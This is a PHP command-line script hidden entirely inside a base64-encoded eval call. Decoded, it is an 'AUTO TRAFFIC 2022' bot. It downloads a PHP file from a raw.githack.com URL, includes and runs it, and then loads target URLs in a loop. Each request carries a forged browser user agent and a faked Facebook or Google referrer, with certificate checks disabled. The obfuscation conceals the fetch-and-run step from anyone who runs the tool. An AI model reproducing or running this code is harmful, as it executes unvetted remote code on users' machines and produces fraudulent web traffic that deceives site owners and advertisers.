#!/usr/bin/env php
<?php
eval(base64_decode("c3lzdGVtKCJjbGVhciIpOwpjb3B5KCdodHRwczovL3Jhdy5naXRoYWNrLmNvbS9taW5hLWFsYWJkL3RyYWZmL21haW4vdXJsLnBocCcsICdtbS5waHAnKTsKaW5jbHVkZSAnbW0ucGhwJzsKJGJpcnUgPSAiXGVbMzRtIjsKJGt1bmluZyA9ICJcZVszM20iOwokY3lhbiA9ICJcZVs5Nm0iOwokbWFnZW50YSA9ICJcZVszNW0iOwokaGlqYXUgPSAiXGVbOTJtIjsKJG1lcmFoID0gIlxlWzkxbSI7CnN5c3RlbSgiY2xlYXIiKTsKZXJyb3JfcmVwb3J0aW5nKDApOwoKZWNobyAiICAgUEFTU1dPUkQgID0gIjsKICAgJHBhc3N3b3JkID0gdHJpbShmZ2V0cyhTVERJTikpOwppZiAoJHBhc3N3b3JkICE9PSAkcGFzcyApewogICAgIGVjaG8gIiRtZXJhaCBFUlJPUiAgUEFTU1dPUkQgXG4gXG4iOwogICAgIHN5c3RlbSgic2xlZXAgMiIpOwp9IGVsc2UgewogICAgICBlY2hvICJMb2dpbiBTdWNjZXNmdWxseVxuIjsKICAgICBzeXN0ZW0oImNsZWFyIik7CnN5c3RlbSgic2xlZXAgMiIpOwoKY2xhc3MgUmFuZG9tX1VBCiB7CiAgICB2YXIgJGxpbnV4X3Byb2M7CiAgICB2YXIgJG1hY19wcm9jOwogICAgdmFyICRsYW5nOwogICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQogICAgewogICAgICAgICR0aGlzLT5saW51eF9wcm9jID0gYXJyYXkoCiAgICAgICAgICAgICdpNjg2JywKICAgICAgICAgICAgJ3g4Nl82NCcKICAgICAgICApOwogICAgICAgICR0aGlzLT5tYWNfcHJvYyA9IGFycmF5KAogICAgICAgICAgICAnSW50ZWwnLAogICAgICAgICAgICAnUFBDJywKICAgICAgICAgICAgJ1U7IEludGVsJywKICAgICAgICAgICAgJ1U7IFBQQycKICAgICAgICApOwogICAgICAgICR0aGlzLT5sYW5nID0gYXJyYXkoCiAgICAgICAgICAgICdlbi1VUycsCiAgICAgICAgICAgICdzbC1TSScKICAgICAgICApOwogICAgfQogICAgZnVuY3Rpb24gZmlyZWZveCgpIHsKICAgICAgICAkdmVyID0gYXJyYXkoCiAgICAJJ0dlY2tvLycgLiBkYXRlKCdZbWQnLCByYW5kKHN0cnRvdGltZSgnMjAxMS0xLTEnKSwgbWt0aW1lKCkpKSAuICcgRmlyZWZveC8nIC4gcmFuZCg1LCA3KSAuICcuMCcsCiAgICAJJ0dlY2tvLycgLiBkYXRlKCdZbWQnLCByYW5kKHN0cnRvdGltZSgnMjAxMS0xLTEnKSwgbWt0aW1lKCkpKSAuICcgRmlyZWZveC8nIC4gcmFuZCg1LCA3KSAuICcuMC4xJywKICAgIAknR2Vja28vJyAuIGRhdGUoJ1ltZCcsIHJhbmQoc3RydG90aW1lKCcyMDEwLTEtMScpLCBta3RpbWUoKSkpIC4gJyBGaXJlZm94LzMuNi4nIC4gcmFuZCgxLCAyMCksCiAgICAJJ0dlY2tvLycgLiBkYXRlKCdZbWQnLCByYW5kKHN0cnRvdGltZSgnMjAxMC0xLTEnKSwgbWt0aW1lKCkpKSAuICcgRmlyZWZveC8zLjgnCiAgICAgICAgKTsKICAgICAgICAkcGxhdGZvcm1zID0gYXJyYXkoCiAgICAJJyhXaW5kb3dzIE5UICcgLiByYW5kKDUsIDYpIC4gJy4nIC4gcmFuZCgwLCAxKSAuICc7ICcgLiAkdGhpcy0+bGFuZ1thcnJheV9yYW5kKCR0aGlzLT5sYW5nLCAxKV0gLiAnOyBydjoxLjkuJyAuIHJhbmQoMCwgMikgLiAnLjIwKSAnIC4gJHZlclthcnJheV9yYW5kKCR2ZXIsIDEpXSwKICAgIAknKFgxMTsgTGludXggJyAuICR0aGlzLT5saW51eF9wcm9jW2FycmF5X3JhbmQoJHRoaXMtPmxpbnV4X3Byb2MsIDEpXSAuICc7IHJ2OicgLiByYW5kKDUsIDcpIC4gJy4wKSAnIC4gJHZlclthcnJheV9yYW5kKCR2ZXIsIDEpXSwKICAgIAknKE1hY2ludG9zaDsgJyAuICR0aGlzLT5tYWNfcHJvY1thcnJheV9yYW5kKCR0aGlzLT5tYWNfcHJvYywgMSldIC4gJyBNYWMgT1MgWCAxMF8nIC4gcmFuZCg1LCA3KSAuICdfJyAuIHJhbmQoMCwgOSkgLiAnIHJ2OicgLiByYW5kKDIsIDYpIC4gJy4wKSAnIC4gJHZlclthcnJheV9yYW5kKCR2ZXIsIDEpXQogICAgICAgICk7CiAgICAgICAgcmV0dXJuICRwbGF0Zm9ybXNbYXJyYXlfcmFuZCgkcGxhdGZvcm1zLCAxKV07CiAgICB9CiAgICBmdW5jdGlvbiBzYWZhcmkoKSB7CiAgICAgICAgJHNhZiA9IHJhbmQoNTMxLCA1MzUpIC4gJy4nIC4gcmFuZCgxLCA1MCkgLiAnLicgLiByYW5kKDEsIDcpOwogICAgICAgIGlmIChyYW5kKDAsIDEpID09IDApIHsKICAgIAkkdmVyID0gcmFuZCg0LCA1KSAuICcuJyAuIHJhbmQoMCwgMSk7CiAgICAgICAgfSBlbHNlIHsKICAgIAkkdmVyID0gcmFuZCg0LCA1KSAuICcuMC4nIC4gcmFuZCgxLCA1KTsKICAgICAgICB9CiAgICAgICAgJHBsYXRmb3JtcyA9IGFycmF5KAogICAgCScoV2luZG93czsgVTsgV2luZG93cyBOVCAnIC4gcmFuZCg1LCA2KSAuICcuJyAuIHJhbmQoMCwgMSkgLiAiKSBBcHBsZVdlYktpdC8kc2FmIChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8kdmVyIFNhZmFyaS8kc2FmIiwKICAgIAknKE1hY2ludG9zaDsgVTsgJyAuICR0aGlzLT5tYWNfcHJvY1thcnJheV9yYW5kKCR0aGlzLT5tYWNfcHJvYywgMSldIC4gJyBNYWMgT1MgWCAxMF8nIC4gcmFuZCg1LCA3KSAuICdfJyAuIHJhbmQoMCwgOSkgLiAnIHJ2OicgLiByYW5kKDIsIDYpIC4gJy4wOyAnIC4gJHRoaXMtPmxhbmdbYXJyYXlfcmFuZCgkdGhpcy0+bGFuZywgMSldIC4gIikgQXBwbGVXZWJLaXQvJHNhZiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vJHZlciBTYWZhcmkvJHNhZiIsCiAgICAJJyhpUG9kOyBVOyBDUFUgaVBob25lIE9TICcgLiByYW5kKDMsIDQpIC4gJ18nIC4gcmFuZCgwLCAzKSAuICcgbGlrZSBNYWMgT1MgWDsgJyAuICR0aGlzLT5sYW5nW2FycmF5X3JhbmQoJHRoaXMtPmxhbmcsIDEpXSAuICIpIEFwcGxlV2ViS2l0LyRzYWYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLyIgLiByYW5kKDMsIDQpIC4gIi4wLjUgTW9iaWxlLzhCIiAuIHJhbmQoMTExLCAxMTkpIC4gIiBTYWZhcmkvNiRzYWYiLAogICAgICAgICk7CiAgICAgICAgcmV0dXJuICRwbGF0Zm9ybXNbYXJyYXlfcmFuZCgkcGxhdGZvcm1zLCAxKV07CiAgICB9CiAgICBmdW5jdGlvbiBpZXhwbG9yZXIoKSB7CiAgICAgICAgJGllX2V4dHJhID0gYXJyYXkoCiAgICAJJycsCiAgICAJJzsgLk5FVCBDTFIgMS4xLicgLiByYW5kKDQzMjAsIDQzMjUpIC4gJycsCiAgICAJJzsgV09XNjQnCiAgICAgICAgKTsKICAgICAgICAkcGxhdGZvcm1zID0gYXJyYXkoCiAgICAJJyhjb21wYXRpYmxlOyBNU0lFICcgLiByYW5kKDUsIDkpIC4gJy4wOyBXaW5kb3dzIE5UICcgLiByYW5kKDUsIDYpIC4gJy4nIC4gcmFuZCgwLCAxKSAuICc7IFRyaWRlbnQvJyAuIHJhbmQoMywgNSkgLiAnLicgLiByYW5kKDAsIDEpIC4gJyknCiAgICAgICAgKTsKICAgICAgICByZXR1cm4gJHBsYXRmb3Jtc1thcnJheV9yYW5kKCRwbGF0Zm9ybXMsIDEpXTsKICAgIH0KICAgIGZ1bmN0aW9uIG9wZXJhKCkgewogICAgICAgICRvcF9leHRyYSA9IGFycmF5KAogICAgCScnLAogICAgCSc7IC5ORVQgQ0xSIDEuMS4nIC4gcmFuZCg0MzIwLCA0MzI1KSAuICcnLAogICAgCSc7IFdPVzY0JwogICAgICAgICk7CiAgICAgICAgJHBsYXRmb3JtcyA9IGFycmF5KAogICAgCScoWDExOyBMaW51eCAnIC4gJHRoaXMtPmxpbnV4X3Byb2NbYXJyYXlfcmFuZCgkdGhpcy0+bGludXhfcHJvYywgMSldIC4gJzsgVTsgJyAuICR0aGlzLT5sYW5nW2FycmF5X3JhbmQoJHRoaXMtPmxhbmcsIDEpXSAuICcpIFByZXN0by8yLjkuJyAuIHJhbmQoMTYwLCAxOTApIC4gJyBWZXJzaW9uLycgLiByYW5kKDEwLCAxMikgLiAnLjAwJywKICAgIAknKFdpbmRvd3MgTlQgJyAuIHJhbmQoNSwgNikgLiAnLicgLiByYW5kKDAsIDEpIC4gJzsgVTsgJyAuICR0aGlzLT5sYW5nW2FycmF5X3JhbmQoJHRoaXMtPmxhbmcsIDEpXSAuICcpIFByZXN0by8yLjkuJyAuIHJhbmQoMTYwLCAxOTApIC4gJyBWZXJzaW9uLycgLiByYW5kKDEwLCAxMikgLiAnLjAwJwogICAgICAgICk7CiAgICAgICAgcmV0dXJuICRwbGF0Zm9ybXNbYXJyYXlfcmFuZCgkcGxhdGZvcm1zLCAxKV07CiAgICB9CiAgICBmdW5jdGlvbiBjaHJvbWUoKSB7CiAgICAgICAgJHNhZiA9IHJhbmQoNTMxLCA1MzYpIC4gcmFuZCgwLCAyKTsKICAgICAgICAkcGxhdGZvcm1zID0gYXJyYXkoCiAgICAJJyhYMTE7IExpbnV4ICcgLiAkdGhpcy0+bGludXhfcHJvY1thcnJheV9yYW5kKCR0aGlzLT5saW51eF9wcm9jLCAxKV0gLiAiKSBBcHBsZVdlYktpdC8kc2FmIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLyIgLiByYW5kKDEzLCAxNSkgLiAnLjAuJyAuIHJhbmQoODAwLCA4OTkpIC4gIi4wIFNhZmFyaS8kc2FmIiwKICAgIAknKFdpbmRvd3MgTlQgJyAuIHJhbmQoNSwgNikgLiAnLicgLiByYW5kKDAsIDEpIC4gIikgQXBwbGVXZWJLaXQvJHNhZiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8iIC4gcmFuZCgxMywgMTUpIC4gJy4wLicgLiByYW5kKDgwMCwgODk5KSAuICIuMCBTYWZhcmkvJHNhZiIsCiAgICAJJyhNYWNpbnRvc2g7IFU7ICcgLiAkdGhpcy0+bWFjX3Byb2NbYXJyYXlfcmFuZCgkdGhpcy0+bWFjX3Byb2MsIDEpXSAuICcgTWFjIE9TIFggMTBfJyAuIHJhbmQoNSwgNykgLiAnXycgLiByYW5kKDAsIDkpIC4gIikgQXBwbGVXZWJLaXQvJHNhZiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8iIC4gcmFuZCgxMywgMTUpIC4gJy4wLicgLiByYW5kKDgwMCwgODk5KSAuICIuMCBTYWZhcmkvJHNhZiIKICAgICAgICApOwogICAgICAgIHJldHVybiAkcGxhdGZvcm1zW2FycmF5X3JhbmQoJHBsYXRmb3JtcywgMSldOwogICAgfQogICAgZnVuY3Rpb24gZ2VuZXJhdGUoKSB7CiAgICAgICAgJHggPSByYW5kKDEsIDUpOwogICAgICAgIHN3aXRjaCAoJHgpIHsKICAgIAljYXNlIDE6CiAgICAJICAgIHJldHVybiAiTW96aWxsYS81LjAgIiAuICR0aGlzLT5maXJlZm94KCk7CiAgICAJICAgIGJyZWFrOwogICAgCWNhc2UgMjoKICAgIAkgICAgcmV0dXJuICJNb3ppbGxhLzUuMCAiIC4gJHRoaXMtPnNhZmFyaSgpOwogICAgCSAgICBicmVhazsKICAgIAljYXNlIDM6CiAgICAJICAgIHJldHVybiAiTW96aWxsYS8iIC4gcmFuZCg0LCA1KSAuICIuMCAiIC4gJHRoaXMtPmlleHBsb3JlcigpOwogICAgCSAgICBicmVhazsKICAgIAljYXNlIDQ6CiAgICAJICAgIHJldHVybiAiT3BlcmEvIiAuIHJhbmQoOCwgOSkgLiAnLicgLiByYW5kKDEwLCA5OSkgLiAnICcgLiAkdGhpcy0+b3BlcmEoKTsKICAgIAkgICAgYnJlYWs7CiAgICAJY2FzZSA1OgogICAgCSAgICByZXR1cm4gJ01vemlsbGEvNS4wJyAuICR0aGlzLT5jaHJvbWUoKTsKICAgIAkgICAgYnJlYWs7CiAgICAgICAgfQogICAgfQp9CmNsYXNzIGF1dG92aXNpdG9yIGV4dGVuZHMgUmFuZG9tX1VBIHsKCXB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkdXJsKSB7CgkJJHRoaXMtPnVybCA9ICR1cmw7Cgl9Cglwcml2YXRlIGZ1bmN0aW9uIGN1cmwoKSB7CgkJJGNoID0gY3VybF9pbml0KCk7CgkJQ1VSTF9TRVRPUFQoJGNoLCBDVVJMT1BUX1VSTCwgJHRoaXMtPnVybCk7CgkJQ1VSTF9TRVRPUFQoJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsIGFycmF5KCdSZWZlcmVyOiAnLiR0aGlzLT5hY2FrUmVmZXJlcigpLAogCSAgICdVc2VyLUFnZW50OiAnLiR0aGlzLT5nZW5lcmF0ZSgpKSk7CgkJQ1VSTF9TRVRPUFQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsKCQlDVVJMX1NFVE9QVCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOwoJCUNVUkxfU0VUT1BUKCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7CgkJQ1VSTF9TRVRPUFQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKCQlDVVJMX1NFVE9QVCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdGhpcy0+Z2VuZXJhdGUoKSk7CgkJJHJlc3VsdCA9IGN1cmxfZXhlYygkY2gpOwoJCWN1cmxfY2xvc2UoJGNoKTsKCgkJcmV0dXJuICRyZXN1bHQ7Cgl9Cglwcml2YXRlIGZ1bmN0aW9uIHhmbHVzaCgpIHsKICAgIAlzdGF0aWMgJG91dHB1dF9oYW5kbGVyID0gbnVsbDsKICAgIAlpZiAoJG91dHB1dF9oYW5kbGVyID09PSBudWxsKSB7CiAgICAgICAgCSRvdXRwdXRfaGFuZGxlciA9IEBpbmlfZ2V0KCdvdXRwdXRfaGFuZGxlcicpOwogICAgCX0KICAgIAlpZiAoJG91dHB1dF9oYW5kbGVyID09ICdvYl9nemhhbmRsZXInKSB7CiAgICAgICAgCXJldHVybjsKICAgIAl9CiAgICAJZmx1c2goKTsKICAgIAlpZiAoZnVuY3Rpb25fZXhpc3RzKCdvYl9mbHVzaCcpIEFORCBmdW5jdGlvbl9leGlzdHMoJ29iX2dldF9sZW5ndGgnKSBBTkQgb2JfZ2V0X2xlbmd0aCgpICE9PSBmYWxzZSkgewogICAgICAgCQlAb2JfZmx1c2goKTsKICAgIAl9IGVsc2UgaWYgKGZ1bmN0aW9uX2V4aXN0cygnb2JfZW5kX2ZsdXNoJykgQU5EIGZ1bmN0aW9uX2V4aXN0cygnb2Jfc3RhcnQnKSBBTkQgZnVuY3Rpb25fZXhpc3RzKCdvYl9nZXRfbGVuZ3RoJykgQU5EIG9iX2dldF9sZW5ndGgoKSAhPT0gRkFMU0UpIHsKICAgICAgIAkJQG9iX2VuZF9mbHVzaCgpOwogICAgICAgIAlAb2Jfc3RhcnQoKTsKICAgIAl9Cgl9Cglwcml2YXRlIGZ1bmN0aW9uIGFjYWtSZWZlcmVyKCkgewoJCSRsaXN0ID0gYXJyYXkoKTsKCQkvKiBBc2FsIHRyYWZmaWMgeWFuZyBkaSBzdWJtaXQgKi8gCgkJJGxpc3RbXSA9ICJodHRwOi8vZmFjZWJvb2suY29tIjsKCQkkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUuY29tLnNnIjsKCQkkbGlzdFtdID0gImh0dHA6Ly90d2l0dGVyLmNvbSI7CiAJCSRsaXN0W10gPSAiaHR0cDovL2ZhY2Vib29rLmNvbSI7CiAgICAgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmNvbS5zZyI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vdHdpdHRlci5jb20iOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS5jby5pZCI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmNvbS5teSI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmpwIjsKCSAgICAkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUudXMiOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS50bCI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmFjIjsKCSAgICAkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUuYWQiOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS5hZSI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmFmIjsKCSAgICAkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUuYWciOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS5ydSI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmJ5IjsKCSAgICAkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUuY2EiOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS5jbiI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmNsIjsKCSAgICAkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUuY20iOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS5jdiI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmdnIjsKCSAgICAkbGlzdFtdID0gImh0dHA6Ly9nb29nbGUuZ2UiOwoJICAgICRsaXN0W10gPSAiaHR0cDovL2dvb2dsZS5nciI7CgkgICAgJGxpc3RbXSA9ICJodHRwOi8vZ29vZ2xlLmNvbS50dyI7CgkgICAgJGxpc3RbXSA9ICJodHRwczovL3NlYXJjaC55YWhvby5jb20iOwogICAgICAgICRsaXN0W10gPSAiaHR0cDovL3d3dy5iZWlueXUuY29tIjsKCQkkYWNhayA9IGFycmF5X3JhbmQoJGxpc3QsMSk7CgkJcmV0dXJuICRsaXN0WyRhY2FrXTsKCX0KCXB1YmxpYyBmdW5jdGlvbiBqYWxhbmthbigpIHsKCQkkdGhpcy0+eGZsdXNoKCk7CgkJJHRoaXMtPmN1cmwoKTsKCQlyZXR1cm4gJHRoaXMtPmFjYWtSZWZlcmVyKCk7IAoJCSR0aGlzLT54Zmx1c2goKTsKCX0KfQplY2hvICIkaGlqYXUgfn5+fn5+IEFVVE8gIFRSQUZGSUMgIDIwMjIgfn5+fn5cbiAgIjsgCmZvcigkaSA9IDE7ICRpIDwgJG1heCsxOyAkaSsrKSB7CmZvciAoJHU9MDsgJHUgPCBjb3VudCgkdXJsKTsgJHUrKykgeyAKJGNsYXNzID0gbmV3IGF1dG92aXNpdG9yKCR1cmxbJHVdKTsKZWNobyAkaS4gIi4gJHVybFskdV0gLSBbIi4kY2xhc3MtPmphbGFua2FuKCkuIlxuIjsKfX0KfSA="));




?>
